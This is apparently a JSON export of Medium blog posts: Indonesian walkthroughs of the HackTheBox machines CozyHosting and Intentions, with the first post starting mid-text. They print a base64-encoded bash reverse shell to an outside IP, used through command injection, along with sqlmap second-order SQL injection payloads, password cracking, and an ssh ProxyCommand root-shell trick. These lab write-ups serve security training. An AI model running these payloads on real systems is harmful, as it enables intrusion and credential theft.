melakukan manipulasi session dengan menggunakan cookie Kanderson, dan terlihat kita berhasil masuk ke dalam Dashboard Admin.</p <figure <img alt=\"\" src=\"https://cdn images 1.medium.com/max/1024/1 kUWfDBqsaEwIHy73p 204Q.png\" </figure <p Pada burp, terlihat pesan error meng indikasikan adanya celah <strong <em Command Injection</em </strong pada aplikasi ini.</p <figure <img alt=\"\" src=\"https://cdn images 1.medium.com/max/1024/1 N7DkBJYMHxZLuBKLXArfzg.png\" </figure <p Sekarang kita coba untuk memasukkan payload berikut untuk mendapatkan RCE :</p <pre /bin/bash i &gt;&amp; /dev/tcp/10.10.16.68/9991 0&gt;&amp;1 &gt; encode Base64<br <br ;echo${IFS}\"L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzEwLjEwLjE0LjQ3LzQ0NDQgMD4mMQ==\"|base64${IFS} d|bash;</pre <p Selanjutnya gunakan listener dari <strong netcat</strong untuk mendapatkan reverse shell.</p <pre nc lvnp &lt;port&gt;</pre <p Pada halaman web, kita akan mendapat response 504 Gateway Time out.</p <figure <img alt=\"\" src=\"https://cdn images 1.medium.com/max/1024/1 el6UugPRTFSdHn2EkgXFYw.png\" </figure <p Dan pada terminal, terlihat kita berhasil mendapatkan Reverse Shell.</p <figure <img alt=\"\" src=\"https://cdn images 1.medium.com/max/787/1 fy4IaBu6H1yVdXRk g7qjg.png\" </figure <p Pada tahap ini, terdapat file .jar pada path /app, selanjutnya download file .jar tersebut dengan menggunakan python http server :</p <pre python m http.server 1334</pre <figure <img alt=\"\" src=\"https://cdn images 1.medium.com/max/1024/1 awZ7B0yAWb2 GDBcXKiq7Q.png\" </figure <p Lakukan decompile pada file .jar tersebut dengan menggunakan Online Decompiling Tools, dan setelah dilakukan decompile terlihat hasil berikut pada Application Properties :</p <figure <img alt=\"\" src=\"https://cdn images 1.medium.com/max/755/1 yaRY Fs EG IxyZx1 dGww.png\" </figure <p Terlihat beberapa informasi sensitif berupa Database yang menggunakan PostgreSQL dan disini saya mencoba untuk melakukan koneksi ke database tersebut dengan command berikut :</p <pre psql U postgres W h localhost d cozyhosting</pre <blockquote psql: manages and interacts with PostgreSQL databases.</blockquote <blockquote U: specifies the db username to connect to the database</blockquote <blockquote W: prompts the user for the password before connecting to db</blockquote <blockquote h: specifies the hostname of the PostgreSQL server. In this case, it's connecting to the local machine (localhost).</blockquote <blockquote d cozyhosting: name of the database ( d) to connect to, which in this case is \"cozyhosting.\"</blockquote <figure <img alt=\"\" src=\"https://cdn images 1.medium.com/max/1024/1 2aHNV2dgAo7Yx 7QhCCkaw.png\" </figure <p Saat berhasil meng akses database cozyhosting, buka table users dengan perintah :</p <pre SELECT FROM users;</pre <figure <img alt=\"\" src=\"https://cdn images 1.medium.com/max/805/1 8lLzOR7544vl8wOolF3AAg.png\" </figure <p Pada table tersebut terdapat 2 kredensial. selanjutnya saya melakukan crack pada password dengan menggunakan tools <strong Johntheripper :</strong </p <pre john w /usr/share/wordlists/rockyou.txt hash.txt</pre <p Kemudian setelah berhasil mendapatkan password, saya melakukan Koneksi SSH menggunakan username josh dengan command :</p <pre ssh josh@10.10.11.230</pre <p Saat berhasil masuk akan terlihat file flag user.txt</p <figure <img alt=\"\" src=\"https://cdn images 1.medium.com/max/1024/1 eVLgeejDfVxeoTUNA3nsEw.png\" </figure <p Langkah selanjutnya adalah mencari flag root pada machine ini dengan metode Privilage Escalation.</p <h3 PRIVILAGE ESCALATION</h3 <p Pertama mari kita cek privilage terlebih dahulu dengan command :</p <pre sudo l</pre <figure <img alt=\"\" src=\"https://cdn images 1.medium.com/max/1024/1 bs2bSQ5s2Qgw8pVj58NI8g.png\" </figure <p Di dalam skenario ini, user Josh memiliki akses untuk eksekusi privilage dengan perintah berikut :</p <pre sudo /usr/bin/ssh </pre <p Tujuan selanjutnya adalah mengidentifikasi teknik injection perintah SSH yang sesuai. Untungnya, saya menemukan artikel yang berguna di gotFobins, sumber untuk menemukan teknik Binary Exploitation.</p <p Perintah yang saya gunakan memungkinkan untuk mendapat shell interaktif melalui opsi ProxyCommand, dan itulah yang saya butuhkan:</p <pre ssh o ProxyCommand=';sh 0&lt;&amp;2 1&gt;&amp;2' x<br o ProxyCommand=';sh 0&lt;&amp;2 1&gt;&amp;2': specifies a custom ProxyCommand configuration using the o option. ProxyCommand is used to specify a command that should be executed to establish the SSH connection through a proxy or intermediate server.<br sh: This is the shell (usually /bin/sh or /bin/bash) being invoked as a command.<br 0&lt;&amp;2: redirects file descriptor 0 (stdin) to file descriptor 2 (stderr).<br 1&gt;&amp;2: redirects file descriptor 1 (stdout) to file descriptor 2 (stderr).<br When combined, sh 0&lt;&amp;2 1&gt;&amp;2 essentially redirects both standard input and standard output to standard error. This redirection is a common technique used in reverse shell payloads.<br x: This is the target hostname or IP address to which the SSH connection is being established.</pre <p setelah berhasil eksekusi perintah diatas maka akan mendapatkan hasil seperti berikut :</p <figure <img alt=\"\" src=\"https://cdn images 1.medium.com/max/617/1 wIKEC42g3XWBjc SaKAlIQ.png\" </figure <p Selanjutnya adalah membuka file root.txt dengan perintah :</p <pre cat root.txt</pre <img src=\"https://medium.com/ /stat?event=post.clientViewed&amp;referrerSource=full rss&amp;postId=41b061e89a96\" width=\"1\" height=\"1\" alt=\"\"",
    "tags": [
      "hackthebox",
      "penetration-testing"
    ],
    "category": "Medium Article",
    "type": "medium",
    "url": "https://angganvryn.medium.com/hackthebox-cozyhosting-41b061e89a96?source=rss-e8b9da247cdf------2",
    "publishedDate": "2023-10-18 11:21:20",
    "updatedAt": "2023-10-18 11:21:20",
    "readingTime": 5,
    "cover": null
  },
  {
    "id": "https://medium.com/p/a91356086d2c",
    "slug": "https://medium.com/p/a91356086d2c",
    "title": "HackTheBox— Intentions",
    "content": "<figure <img alt=\"\" src=\"https://cdn images 1.medium.com/max/926/1 K3HdYPuVVl1W4X7nCuFr4g.png\" </figure <h3 Enumeration</h3 <p <strong Nmap Result :</strong </p <pre Nmap 7.94 scan initiated Mon Oct 9 02:40:30 2023 as: nmap sCV p oA nmap 10.10.11.220<br Nmap scan report for 10.10.11.220 (10.10.11.220)<br Host is up (0.045s latency).<br Not shown: 65533 closed tcp ports (reset)<br PORT STATE SERVICE VERSION<br 22/tcp open ssh OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)<br | ssh hostkey: <br | 256 47:d2:00:66:27:5e:e6:9c:80:89:03:b5:8f:9e:60:e5 (ECDSA)<br | 256 c8:d0:ac:8d:29:9b:87:40:5f:1b:b0:a4:1d:53:8f:f1 (ED25519)<br 80/tcp open http nginx 1.18.0 (Ubuntu)<br | http server header: nginx/1.18.0 (Ubuntu)<br | http title: Intentions<br Service Info: OS: Linux; CPE: cpe:/o:linux:linux kernel<br Service detection performed. Please report any incorrect results at<a href=\"https://nmap.org/submit/\" https://nmap.org/submit</a / .<br Nmap done at Mon Oct 9 02:40:59 2023 1 IP address (1 host up) scanned in 29.29 seconds</pre <p Dari hasil nmap diatas, terdapat informasi 2 port terbuka. pada port 22 terdapat SSH Server yang berjalan dan pada port 80 terdapat nginx web server. Akan tetapi saya belum memiliki kredensial SSH yang valid, maka kita akan memulai dengan menganalisa entry point exploit pada port 80.</p <h3 Nginx — Port 80</h3 <p Sebelum mulai, tambahkan IP Host ke dalam host file dengan menggunakan command berikut :</p <pre echo \"10.129.83.115 intentions.htb\" | sudo tee a /etc/hosts</pre <p Pada saat membuka [<a href=\"http://intentions.htb/\" http://intentions.htb</a ] makan akan muncul tampilan seperti berikut :</p <figure <img alt=\"\" src=\"https://cdn images 1.medium.com/max/684/1 AneKn2W18DhlZ24YDfGlg.png\" </figure <figure <img alt=\"\" src=\"https://cdn images 1.medium.com/max/745/1 kehqvRhr3RGvTvvesAoeGg.png\" </figure <p Terdapat halaman Login dan Registrasi.</p <p Sebelum saya melakukan registrasi, saya akan mencoba untuk Fuzzing direktori dengan menggunakan tools <strong gobuster</strong :</p <pre gobuster dir w /usr/share/seclists/Discovery/Web Content/big.txt e t 100 u http://intentions.htb/ b 403,404 o gobuster</pre <figure <img alt=\"\" src=\"https://cdn images 1.medium.com/max/980/1 LuASiDzbQt3Ki1xCCkKh6A.png\" </figure <p Terdapat 3 path yang menarik yaitu /admin, /gallery dan /storage.</p <h3 Apps Enumeration</h3 <p Pada tahap ini saya mencoba untuk melakukan Bypass login namun gagal, maka saya memutuskan untuk registrasi normal user untuk masuk kedalam aplikasi.</p <figure <img alt=\"\" src=\"https://cdn images 1.medium.com/max/735/1 UvkGlNVoU08RmGFvmwdYcA.png\" </figure <p Pada halaman <em homepage</em aplikasi akan muncul tampilan seperti berikut.</p <figure <img alt=\"\" src=\"https://cdn images 1.medium.com/max/1024/1 Q hlp6nRQ3eLEwk3AYgI g.png\" </figure <p Menu <em Gallery</em dan <em Feed</em berfungsi untuk menampilkan gambar berdasarkan filter <em genres</em .</p <figure <img alt=\"\" src=\"https://cdn images 1.medium.com/max/1024/1 YoKXD5DR7LYjBPVjQucPA.png\" </figure <figure <img alt=\"\" src=\"https://cdn images 1.medium.com/max/1024/1 ibUrDMN159kWE0 78oX1iQ.png\" </figure <p Dan pada menu <em Profile</em kita bisa lihat bahwa ada form “Favourite Genre” yang secara default memiliki value “food,travel,nature” .</p <p Dari konteks diatas, Kita dapat menyimpulkan bahwa API yang mendukung halaman feed memanfaatkan pengaturan profil ini untuk menampilkan konten yang relevan.</p <figure <img alt=\"\" src=\"https://cdn images 1.medium.com/max/1024/1 IklKYg G3duqlOf2ODrpSg.png\" </figure <p Mengingat pada fitur ini adalah salah satu dari sedikit tempat/entry point pada aplikasi web untuk diproses oleh backend atau API, saya akan melanjutkan enumerasi di fitur ini dan mencari kemungkinan entry point Injection serta melihat response dan perilaku mencurigakan lainnya.</p <p Pada tahap ini saya menggunakan <strong Burpsuite</strong untuk meng intercept Request dan melakukan analisa pada response yang diterima.</p <ul <li Permintaan POST ke <a href=\"http://intentions.htb/api/v1/gallery/user/genres\" http://intentions.htb/api/v1/gallery/user/genres</a untuk memperbarui genre favorit</li <li Permintaan GET ke <a href=\"http://intentions.htb/api/v1/gallery/user/feed\" http://intentions.htb/api/v1/gallery/user/feed</a untuk mengambil feed.</li </ul <p Tujuan selanjutnya adalah untuk meneruskan request ini ke <strong sqlmap</strong , jadi saya harus menyimpan konten dari setiap request ini ke dalam sebuah file. saua akan menyimpan permintaan POST ke /user/genres sebagai updateGenresRequest dan akan terlihat seperti berikut :</p <pre POST /api/v1/gallery/user/genres HTTP/1.1<br Host: 10.10.11.220<br User Agent: Mozilla/5.0 (X11; Linux x86 64; rv:109.0) Gecko/20100101 Firefox/115.0<br Accept: application/json, text/plain, / <br Accept Language: en US,en;q=0.5<br Accept Encoding: gzip, deflate<br X Requested With: XMLHttpRequest<br Content Type: application/json<br X XSRF TOKEN: eyJpdiI6Ikd2cWRrcjhWdElQQUhTV0tFQkRCc2c9PSIsInZhbHVlIjoiY1JLQUMwbCtPekNaUDNUV2puQk9Da2ZpK0JNSjJyb1NTZTR1bVZPODhzR29OK1hRTndJcHozQWtLNU1kUXJOL3U3SC9qVllBVHBJbzlIVlM3TGNYc1kxd0lxOVRJVUdBUXk4WDFSUi9RSzNEcVZzVGNnZHpxN0FzQjNQK0lKZEsiLCJtYWMiOiJhZTg3OTE4Y2M4NGQ0NmY2MjgxMzg2MDQzMGRjNDhjZTE2ZjA2ODk4YmJiOWI3NDdkYjZjMzdkM2Q4MjVkYzIyIiwidGFnIjoiIn0=<br Content Length: 17<br Origin: http://10.10.11.220<br Connection: close<br Referer: http://10.10.11.220/gallery<br Cookie: XSRF TOKEN=eyJpdiI6Ikd2cWRrcjhWdElQQUhTV0tFQkRCc2c9PSIsInZhbHVlIjoiY1JLQUMwbCtPekNaUDNUV2puQk9Da2ZpK0JNSjJyb1NTZTR1bVZPODhzR29OK1hRTndJcHozQWtLNU1kUXJOL3U3SC9qVllBVHBJbzlIVlM3TGNYc1kxd0lxOVRJVUdBUXk4WDFSUi9RSzNEcVZzVGNnZHpxN0FzQjNQK0lKZEsiLCJtYWMiOiJhZTg3OTE4Y2M4NGQ0NmY2MjgxMzg2MDQzMGRjNDhjZTE2ZjA2ODk4YmJiOWI3NDdkYjZjMzdkM2Q4MjVkYzIyIiwidGFnIjoiIn0%3D; intentions session=eyJpdiI6IkdsMXdPTkFORDdLUjJHMTVOcGM0VGc9PSIsInZhbHVlIjoiTmdwZTIvY3pESFdjbnVQZFJON2lsUnhPdXF0eG53RDFiUW5YTTRWRmFXcFNBeEdRY1dadDFKTUxBS2tSbHhjbXVDQjBxTmxsdVFGUUxaMklWSmJCZmtFUmtCd0lqdExhNUVpUGl2ZTh3UU9XUU8vVzF5MThyTnRFV0FFQWZFeVIiLCJtYWMiOiIwZjk5Yjc0YjJmOTRmYzM4MDU4YTFiNzViZWE5OTkwYzUzNTViZTUwNzY2YjI5Y2YxZWI5Mzg1NThmOThjNGQyIiwidGFnIjoiIn0%3D; token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJodHRwOi8vMTAuMTAuMTEuMjIwL2FwaS92MS9hdXRoL2xvZ2luIiwiaWF0IjoxNjk3NDg1NjAzLCJleHAiOjE2OTc1MDcyMDMsIm5iZiI6MTY5NzQ4NTYwMywianRpIjoiVUgyb09Oc0NWUEVCdmNuYSIsInN1YiI6IjMwIiwicHJ2IjoiMjNiZDVjODk0OWY2MDBhZGIzOWU3MDFjNDAwODcyZGI3YTU5NzZmNyJ9.3VU1sk2yzmM9Gch4QuUyEeI drctCniqtfbEzSV5sKw<br <br {\"genres\":\"food\"}</pre <p Saya juga menyimpan GET Request /user/feed menjadi file fetchFeedRequest dan akan terlihat seperti berikut :</p <pre GET /api/v1/gallery/user/feed HTTP/1.1<br Host: 10.10.11.220<br User Agent: Mozilla/5.0 (X11; Linux x86 64; rv:109.0) Gecko/20100101 Firefox/115.0<br Accept: application/json, text/plain, / <br Accept Language: en US,en;q=0.5<br Accept Encoding: gzip, deflate<br X Requested With: XMLHttpRequest<br X XSRF TOKEN: eyJpdiI6Ikd2cWRrcjhWdElQQUhTV0tFQkRCc2c9PSIsInZhbHVlIjoiY1JLQUMwbCtPekNaUDNUV2puQk9Da2ZpK0JNSjJyb1NTZTR1bVZPODhzR29OK1hRTndJcHozQWtLNU1kUXJOL3U3SC9qVllBVHBJbzlIVlM3TGNYc1kxd0lxOVRJVUdBUXk4WDFSUi9RSzNEcVZzVGNnZHpxN0FzQjNQK0lKZEsiLCJtYWMiOiJhZTg3OTE4Y2M4NGQ0NmY2MjgxMzg2MDQzMGRjNDhjZTE2ZjA2ODk4YmJiOWI3NDdkYjZjMzdkM2Q4MjVkYzIyIiwidGFnIjoiIn0=<br Connection: close<br Referer: http://10.10.11.220/gallery<br Cookie: XSRF TOKEN=eyJpdiI6Ikd2cWRrcjhWdElQQUhTV0tFQkRCc2c9PSIsInZhbHVlIjoiY1JLQUMwbCtPekNaUDNUV2puQk9Da2ZpK0JNSjJyb1NTZTR1bVZPODhzR29OK1hRTndJcHozQWtLNU1kUXJOL3U3SC9qVllBVHBJbzlIVlM3TGNYc1kxd0lxOVRJVUdBUXk4WDFSUi9RSzNEcVZzVGNnZHpxN0FzQjNQK0lKZEsiLCJtYWMiOiJhZTg3OTE4Y2M4NGQ0NmY2MjgxMzg2MDQzMGRjNDhjZTE2ZjA2ODk4YmJiOWI3NDdkYjZjMzdkM2Q4MjVkYzIyIiwidGFnIjoiIn0%3D; intentions session=eyJpdiI6IkdsMXdPTkFORDdLUjJHMTVOcGM0VGc9PSIsInZhbHVlIjoiTmdwZTIvY3pESFdjbnVQZFJON2lsUnhPdXF0eG53RDFiUW5YTTRWRmFXcFNBeEdRY1dadDFKTUxBS2tSbHhjbXVDQjBxTmxsdVFGUUxaMklWSmJCZmtFUmtCd0lqdExhNUVpUGl2ZTh3UU9XUU8vVzF5MThyTnRFV0FFQWZFeVIiLCJtYWMiOiIwZjk5Yjc0YjJmOTRmYzM4MDU4YTFiNzViZWE5OTkwYzUzNTViZTUwNzY2YjI5Y2YxZWI5Mzg1NThmOThjNGQyIiwidGFnIjoiIn0%3D; token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJodHRwOi8vMTAuMTAuMTEuMjIwL2FwaS92MS9hdXRoL2xvZ2luIiwiaWF0IjoxNjk3NDg1NjAzLCJleHAiOjE2OTc1MDcyMDMsIm5iZiI6MTY5NzQ4NTYwMywianRpIjoiVUgyb09Oc0NWUEVCdmNuYSIsInN1YiI6IjMwIiwicHJ2IjoiMjNiZDVjODk0OWY2MDBhZGIzOWU3MDFjNDAwODcyZGI3YTU5NzZmNyJ9.3VU1sk2yzmM9Gch4QuUyEeI drctCniqtfbEzSV5sKw</pre <p Pada tahap ini kita akan melakukan evaluasi request diatas apakah memungkinkan untuk dilakukan SQL Injection menggunakan <strong Sqlmap</strong .</p <h3 Fitur “Update Genres”</h3 <pre sqlmap r updateGenresRequest batch</pre <p Command diatas merupakan basic scan <strong sqlmap</strong untuk updateGenresRequest akan tetapi tidak berhasil.</p <figure <img alt=\"\" src=\"https://cdn images 1.medium.com/max/1024/1 qtb NJCxO1pBTqqb0Yokrw.png\" </figure <h3 Kombinasi Update Request dan Fetch Feed Request</h3 <p Selanjutnya, kita mencoba scan kedua request menggunakan <strong sqlmap</strong , akan tetapi masih belum berhasil.</p <figure <img alt=\"\" src=\"https://cdn images 1.medium.com/max/1024/1 1a3S68bS5JvmlNiqFUFWsA.png\" </figure <p Akan tetapi dapat terlihat pada form “favourite genres” secara langsung terhubung dengan feed kita. Maka selanjutnya kita coba eksplorasi teknik lainnya, terlihat <strong sqlmap</strong menyarankan untuk menggunakan tamper script.</p <pre maybe you could try to use option ' tamper' (e.g. ' tamper=space2comment')<br and/or switch ' random agent'</pre <p Jika kita berinteraksi secara manual dengan endpoint terlihat pada request update genre, kita dapat mengamati bahwa request dengan <em spasi</em seperti ‘nature, animals, test’ akan menjadi ‘nature,animals,test’. Dan saat berikutnya kita mengunjungi halaman, menunjukkan bahwa spasi secara aktif dihapus. Disini saya langsung mencoba untuk melakukan pemeriksaan SQLi tingkat kedua dengan Tamper Script untuk mengubah spasi :</p <pre sqlmap r updateGenresRequest second req=fetchFeedRequest dbms=MySQL batch tamper=space2comment level=5</pre <pre Note: Sometimes this may only identify a time based SQL injection, at which point we can optionally extend our check by specifying dbms=MySQL level=5</pre <p Finally! kita berhasil melakukan SQL Injection dengan result sebagai berikut :</p <figure <img alt=\"\" src=\"https://cdn images 1.medium.com/max/1024/1 TyhV7sz20ULkj9GYR9WPUg.png\" </figure <pre Parameter: JSON genres ((custom) POST)<br Type: boolean based blind<br Title: AND boolean based blind WHERE or HAVING clause<br Payload: {\"genres\":\"food’) AND 6484=6484 AND (‘GWSr’=’GWSr\"}<br Type: time based blind<br Title: MySQL &gt;= 5.0.12 AND time based blind (query SLEEP)<br Payload: {\"genres\":\"food’) AND (SELECT 6006 FROM (SELECT(SLEEP(5)))GiDV) AND (‘jDDu’=’jDDu\"}<br Type: UNION query<br Title: MySQL UNION query (NULL) 5 columns<br Payload: {\"genres\":\"food') UNION ALL SELECT NULL,NULL,CONCAT(0x7171716271,0x4a68777a6e676465764b7a46776854567759646c4d61536a7678516b6f52476e4446676556564a57,0x717a7a7171),NULL,NULL \"}<br +<br | gallery images |<br | migrations |<br | personal access tokens |<br | users |<br + a/tests/Feature/Helper.php<br +++ b/tests/Feature/Helper.php<br @@ 8,12 +8,14 @@ class Helper extends TestCase<br {<br public static function getToken($test, $admin = false) {<br if($admin) {<br $res = $test &gt;postJson('/api/v1/auth/login', ['email' =&gt; 'greg@intentions.htb', 'password' =&gt; 'Gr3g1sTh3B3stDev3l0per!1998!']);<br return $res &gt;headers &gt;get('Authorization');<br + $user = User::factory() &gt;admin() &gt;create();<br } <br else {<br $res = $test &gt;postJson('/api/v1/auth/login', ['email' =&gt; 'greg user@intentions.htb', 'password' =&gt; 'Gr3g1sTh3B3stDev3l0per!1998!']);<br return $res &gt;headers &gt;get('Authorization');<br + $user = User::factory() &gt;create();<br }<br + <br + $token = Auth::login($user);<br + $user &gt;delete();<br + return $token;<br }<br }</pre <p Disini bisa dilihat saya menemukan kata sandi (Gr3g1sTh3B3stDev3l0per!1998!) pada riwayat commit, yang dapat digunakan untuk SSH ke dalam kotak sebagai user greg.</p <pre ssh greg@intentions.htb</pre <pre greg@intentions: $ id<br uid=1001(greg) gid=1001(greg) groups=1001(greg),1003(scanner)</pre <p Disini bisa dilihat bahwa user greg adalah bagian dari Scanner group, dan user flag bisa ditemukan pada path “/home/greg/flag.txt”.</p <figure <img alt=\"\" src=\"https://cdn images 1.medium.com/max/764/1 6Ajt e xFR7LLy6iSaN0eA.png\" </figure <h3 Privilage Escalation</h3 <p Ketika berhasil autentikasi menggunakan user greg, kita melihat file menarik pada direktory. <strong dmca check.sh</strong dan <strong dmca hashes.test</strong </p <pre total 52<br drwxr x 1 root greg 75 Jun 10 17:33 dmca check.sh<br rwxr 1 root greg 33 Oct 17 05:27 user.txt<br rw r r 1 greg greg 39 Jun 14 10:18 .vimrc</pre <p Pada <strong dmca chech.sh</strong kita bisa melihat bahwa file tersebut meng eksekusi command berikut :</p <pre /opt/scanner/scanner d /home/legal/uploads h /home/greg/dmca hashes.test</pre <p Pada saat menjalankan Command diatas, terlihat output seperti berikut :</p <pre greg@intentions: $ /opt/scanner/scanner d /home/legal/uploads h /home/greg/dmca hashes.test</pre <pre [+] DMCA 1952 matches /home/legal/uploads/zac porter p yotEbRA0A unsplash.jpg</pre <p Terlihat bahwa user greg tidak memiliki akses untuk inpect file tersebut.</p <pre greg@intentions: $ ls /home/legal/uploads/</pre <pre ls: cannot access '/home/legal/uploads/': Permission denied</pre <pre greg@intentions: $ cat /home/legal/uploads/zac porter p yotEbRA0A unsplash.jpg</pre <pre cat: /home/legal/uploads/zac porter p yotEbRA0A unsplash.jpg: Permission denied</pre <p Ini seharusnya menjadi indikasi pertama kami bahwa sesuatu yang tidak biasa terjadi dalam hal kontrol akses pada biner ini. Letika memeriksa biner itu sendiri, kita dapat melihat bahwa itu bukan biner setuid, dan saya tidak menjalankannya dengan sudo:</p <pre greg@intentions: $ ls al /opt/scanner/scanner</pre <pre rwxr x BEGIN OPENSSH PRIVATE KEY END OPENSSH PRIVATE KEY <br Done</pre <p Kita beri nama root key, pastikan untuk memberikan permission yang tepat pada file tersebut dan selanjutnya kita gunakan untuk autentikasi sebagai <strong root</strong pada mesin target.</p <pre chmod 600 root key<br ssh i root root@intentions.htb</pre <pre root@intentions: id<br uid=0(root) gid=0(root) groups=0(root)</pre <figure <img alt=\"\" src=\"https://cdn images 1.medium.com/max/473/1 5JkfFiRNP8oiQf5 x4YtiA.png\" </figure <p Setelah berhasil login sebagai root, ambil root flag pada file root.txt</p <figure <img alt=\"\" src=\"https://cdn images 1.medium.com/max/671/1 6j 0QXbI6C921 J6bFiV1Q.png\" </figure <img src=\"https://medium.com/ /stat?event=post.clientViewed&amp;referrerSource=full rss&amp;postId=a91356086d2c\" width=\"1\" height=\"1\" alt=\"\"",
    "excerpt": "<figure <img alt=\"\" src=\"https://cdn images 1.medium.com/max/926/1 K3HdYPuVVl1W4X7nCuFr4g.png\" </figure <h3 Enumeration</h3 <p <strong Nmap Result :</strong </p <pre Nmap 7.94 scan initiated Mon Oct 9 02:40:30 2023 as: n…",
    "description": "<figure <img alt=\"\" src=\"https://cdn images 1.medium.com/max/926/1 K3HdYPuVVl1W4X7nCuFr4g.png\" </figure <h3 Enumeration</h3 <p <strong Nmap Result :</strong </p <pre Nmap 7.94 scan initiated Mon Oct 9 02:40:30 2023 as: nmap sCV p oA nmap 10.10.11.220<br Nmap scan report for 10.10.11.220 (10.10.11.220)<br Host is up (0.045s latency).<br Not shown: 65533 closed tcp ports (reset)<br PORT STATE SERVICE VERSION<br 22/tcp open ssh OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)<br | ssh hostkey: <br | 256 47:d2:00:66:27:5e:e6:9c:80:89:03:b5:8f:9e:60:e5 (ECDSA)<br | 256 c8:d0:ac:8d:29:9b:87:40:5f:1b:b0:a4:1d:53:8f:f1 (ED25519)<br 80/tcp open http nginx 1.18.0 (Ubuntu)<br | http server header: nginx/1.18.0 (Ubuntu)<br | http title: Intentions<br Service Info: OS: Linux; CPE: cpe:/o:linux:linux kernel<br Service detection performed. Please report any incorrect results at<a href=\"https://nmap.org/submit/\" https://nmap.org/submit</a / .<br Nmap done at Mon Oct 9 02:40:59 2023 1 IP address (1 host up) scanned in 29.29 seconds</pre <p Dari hasil nmap diatas, terdapat informasi 2 port terbuka. pada port 22 terdapat SSH Server yang berjalan dan pada port 80 terdapat nginx web server. Akan tetapi saya belum memiliki kredensial SSH yang valid, maka kita akan memulai dengan menganalisa entry point exploit pada port 80.</p <h3 Nginx — Port 80</h3 <p Sebelum mulai, tambahkan IP Host ke dalam host file dengan menggunakan command berikut :</p <pre echo \"10.129.83.115 intentions.htb\" | sudo tee a /etc/hosts</pre <p Pada saat membuka [<a href=\"http://intentions.htb/\" http://intentions.htb</a ] makan akan muncul tampilan seperti berikut :</p <figure <img alt=\"\" src=\"https://cdn images 1.medium.com/max/684/1 AneKn2W18DhlZ24YDfGlg.png\" </figure <figure <img alt=\"\" src=\"https://cdn images 1.medium.com/max/745/1 kehqvRhr3RGvTvvesAoeGg.png\" </figure <p Terdapat halaman Login dan Registrasi.</p <p Sebelum saya melakukan registrasi, saya akan mencoba untuk Fuzzing direktori dengan menggunakan tools <strong gobuster</strong :</p <pre gobuster dir w /usr/share/seclists/Discovery/Web Content/big.txt e t 100 u http://intentions.htb/ b 403,404 o gobuster</pre <figure <img alt=\"\" src=\"https://cdn images 1.medium.com/max/980/1 LuASiDzbQt3Ki1xCCkKh6A.png\" </figure <p Terdapat 3 path yang menarik yaitu /admin, /gallery dan /storage.</p <h3 Apps Enumeration</h3 <p Pada tahap ini saya mencoba untuk melakukan Bypass login namun gagal, maka saya memutuskan untuk registrasi normal user untuk masuk kedalam aplikasi.</p <figure <img alt=\"\" src=\"https://cdn images 1.medium.com/max/735/1 UvkGlNVoU08RmGFvmwdYcA.png\" </figure <p Pada halaman <em homepage</em aplikasi akan muncul tampilan seperti berikut.</p <figure <img alt=\"\" src=\"https://cdn images 1.medium.com/max/1024/1 Q hlp6nRQ3eLEwk3AYgI g.png\" </figure <p Menu <em Gallery</em dan <em Feed</em berfungsi untuk menampilkan gambar berdasarkan filter <em genres</em .</p <figure <img alt=\"\" src=\"https://cdn images 1.medium.com/max/1024/1 YoKXD5DR7LYjBPVjQucPA.png\" </figure <figure <img alt=\"\" src=\"https://cdn images 1.medium.com/max/1024/1 ibUrDMN159kWE0 78oX1iQ.png\" </figure <p Dan pada menu <em Profile</em kita bisa lihat bahwa ada form “Favourite Genre” yang secara default memiliki value “food,travel,nature” .</p <p Dari konteks diatas, Kita dapat menyimpulkan bahwa API yang mendukung halaman feed memanfaatkan pengaturan profil ini untuk menampilkan konten yang relevan.</p <figure <img alt=\"\" src=\"https://cdn images 1.medium.com/max/1024/1 IklKYg G3duqlOf2ODrpSg.png\" </figure <p Mengingat pada fitur ini adalah salah satu dari sedikit tempat/entry point pada aplikasi web untuk diproses oleh backend atau API, saya akan melanjutkan enumerasi di fitur ini dan mencari kemungkinan entry point Injection serta melihat response dan perilaku mencurigakan lainnya.</p <p Pada tahap ini saya menggunakan <strong Burpsuite</strong untuk meng intercept Request dan melakukan analisa pada response yang diterima.</p <ul <li Permintaan POST ke <a href=\"http://intentions.htb/api/v1/gallery/user/genres\" http://intentions.htb/api/v1/gallery/user/genres</a untuk memperbarui genre favorit</li <li Permintaan GET ke <a href=\"http://intentions.htb/api/v1/gallery/user/feed\" http://intentions.htb/api/v1/gallery/user/feed</a untuk mengambil feed.</li </ul <p Tujuan selanjutnya adalah untuk meneruskan request ini ke <strong sqlmap</strong , jadi saya harus menyimpan konten dari setiap request ini ke dalam sebuah file. saua akan menyimpan permintaan POST ke /user/genres sebagai updateGenresRequest dan akan terlihat seperti berikut :</p <pre POST /api/v1/gallery/user/genres HTTP/1.1<br Host: 10.10.11.220<br User Agent: Mozilla/5.0 (X11; Linux x86 64; rv:109.0) Gecko/20100101 Firefox/115.0<br Accept: application/json, text/plain, / <br Accept Language: en US,en;q=0.5<br Accept Encoding: gzip, deflate<br X Requested With: XMLHttpRequest<br Content Type: application/json<br X XSRF TOKEN: eyJpdiI6Ikd2cWRrcjhWdElQQUhTV0tFQkRCc2c9PSIsInZhbHVlIjoiY1JLQUMwbCtPekNaUDNUV2puQk9Da2ZpK0JNSjJyb1NTZTR1bVZPODhzR29OK1hRTndJcHozQWtLNU1kUXJOL3U3SC9qVllBVHBJbzlIVlM3TGNYc1kxd0lxOVRJVUdBUXk4WDFSUi9RSzNEcVZzVGNnZHpxN0FzQjNQK0lKZEsiLCJtYWMiOiJhZTg3OTE4Y2M4NGQ0NmY2MjgxMzg2MDQzMGRjNDhjZTE2ZjA2ODk4YmJiOWI3NDdkYjZjMzdkM2Q4MjVkYzIyIiwidGFnIjoiIn0=<br Content Length: 17<br Origin: http://10.10.11.220<br Connection: close<br Referer: http://10.10.11.220/gallery<br Cookie: XSRF 